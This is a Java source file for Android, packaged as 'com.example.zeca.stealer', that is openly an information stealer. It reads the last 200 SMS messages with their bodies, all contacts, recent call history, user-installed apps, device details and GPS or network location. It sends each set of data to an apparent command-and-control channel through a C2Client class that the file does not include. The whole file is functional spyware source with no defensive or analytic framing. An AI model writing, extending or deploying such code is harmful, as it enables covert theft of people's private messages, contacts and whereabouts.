// lang: Java, file: DataCollector.java, target: Android 8+ API 26
// harvests SMS history, contacts, call log, location, installed apps → exfils via C2Client

package com.example.zeca.stealer;

import android.content.*;
import android.content.pm.*;
import android.database.Cursor;
import android.location.*;
import android.net.Uri;
import android.os.Build;
import android.provider.*;
import android.telephony.TelephonyManager;
import java.util.*;
import java.util.concurrent.*;

public class DataCollector {

    public static void harvest(Context ctx) {
        ExecutorService pool = Executors.newFixedThreadPool(4);

        // collect in parallel, join, send one blob
        Future<String> fSms      = pool.submit(() -> getSms(ctx));
        Future<String> fContacts = pool.submit(() -> getContacts(ctx));
        Future<String> fCalls    = pool.submit(() -> getCallLog(ctx));
        Future<String> fApps     = pool.submit(() -> getInstalledApps(ctx));
        Future<String> fDevice   = pool.submit(() -> getDeviceInfo(ctx));

        try {
            StringBuilder sb = new StringBuilder();
            sb.append("=== DEVICE ===\n").append(fDevice.get()).append("\n");
            sb.append("=== APPS ===\n").append(fApps.get()).append("\n");
            sb.append("=== SMS ===\n").append(fSms.get()).append("\n");
            sb.append("=== CONTACTS ===\n").append(fContacts.get()).append("\n");
            sb.append("=== CALLS ===\n").append(fCalls.get()).append("\n");

            C2Client.send(ctx, "HARVEST", sb.toString());
        } catch (Exception e) {
            C2Client.send(ctx, "ERROR", e.getMessage());
        }
        pool.shutdown();

        // location is async — gets sent separately when fix arrives
        requestLocation(ctx);
    }

    private static String getDeviceInfo(Context ctx) {
        TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        return "Model: "    + Build.MODEL       + "\n" +
               "Brand: "    + Build.BRAND       + "\n" +
               "Android: "  + Build.VERSION.RELEASE + "\n" +
               "SDK: "      + Build.VERSION.SDK_INT + "\n" +
               "Device: "   + Build.DEVICE      + "\n";
    }

    private static String getSms(Context ctx) {
        StringBuilder sb = new StringBuilder();
        try (Cursor c = ctx.getContentResolver().query(
            Uri.parse("content://sms/inbox"),
            new String[]{"address","date","body"},
            null, null, "date DESC LIMIT 200")) {
            if (c != null) while (c.moveToNext()) {
                sb.append("FROM: ").append(c.getString(0))
                  .append(" | ").append(c.getString(2)).append("\n");
            }
        } catch (Exception e) { sb.append("err: ").append(e.getMessage()); }
        return sb.toString();
    }

    private static String getContacts(Context ctx) {
        StringBuilder sb = new StringBuilder();
        try (Cursor c = ctx.getContentResolver().query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            new String[]{
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER},
            null, null, null)) {
            if (c != null) while (c.moveToNext()) {
                sb.append(c.getString(0)).append(": ").append(c.getString(1)).append("\n");
            }
        } catch (Exception e) { sb.append("err: ").append(e.getMessage()); }
        return sb.toString();
    }

    private static String getCallLog(Context ctx) {
        StringBuilder sb = new StringBuilder();
        try (Cursor c = ctx.getContentResolver().query(
            CallLog.Calls.CONTENT_URI,
            new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE},
            null, null, "date DESC LIMIT 100")) {
            if (c != null) while (c.moveToNext()) {
                int callType = c.getInt(1);
                String type;
                if (callType == CallLog.Calls.INCOMING_TYPE) type = "IN";
                else if (callType == CallLog.Calls.OUTGOING_TYPE) type = "OUT";
                else if (callType == CallLog.Calls.MISSED_TYPE) type = "MISS";
                else type = "?";
                sb.append(type).append(" ").append(c.getString(0)).append("\n");
            }
        } catch (Exception e) { sb.append("err: ").append(e.getMessage()); }
        return sb.toString();
    }

    private static String getInstalledApps(Context ctx) {
        StringBuilder sb = new StringBuilder();
        PackageManager pm = ctx.getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        for (ApplicationInfo a : apps) {
            if ((a.flags & ApplicationInfo.FLAG_SYSTEM) == 0)
                sb.append(a.packageName).append("\n");
        }
        return sb.toString();
    }

    private static void requestLocation(Context ctx) {
        LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        try {
            lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, loc -> {
                String coords = "LAT=" + loc.getLatitude() + " LON=" + loc.getLongitude();
                C2Client.send(ctx, "LOCATION", coords);
            }, null);
        } catch (SecurityException e) {
            try {
                lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, loc -> {
                    String coords = "LAT=" + loc.getLatitude() + " LON=" + loc.getLongitude() + " (NETWORK)";
                    C2Client.send(ctx, "LOCATION", coords);
                }, null);
            } catch (SecurityException ignored) {}
        }
    }
}